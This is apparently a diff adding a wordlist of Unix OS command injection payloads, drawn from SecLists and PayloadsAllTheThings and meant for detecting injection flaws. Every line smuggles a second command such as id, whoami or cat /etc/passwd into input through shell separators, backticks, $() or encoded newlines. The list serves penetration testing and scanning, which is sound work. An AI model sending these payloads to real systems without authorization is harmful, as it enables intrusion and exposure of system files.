@@ -1,0 +1,40 @@
+# CMDi Unix Payloads
+# Sources: SecLists, PayloadsAllTheThings
+# Purpose: Detect OS command injection on Unix/Linux systems.
+; id
+| id
+& id
+`id`
+$(id)
+; whoami
+| whoami
+& whoami
+`whoami`
+$(whoami)
+; cat /etc/passwd
+| cat /etc/passwd
+& cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; uname -a
+| uname -a
+& uname -a
+; hostname
+| hostname
+& hostname
+; ls -la
+| ls -la
+& ls -la
+; pwd
+| pwd
+; ifconfig
+| ifconfig
+; id; echo pwned
+| id | cat /etc/passwd
+%0aid
+%0awhoami
+%0a id %0a
+\nid
+\nwhoami
+;id;
+|id|
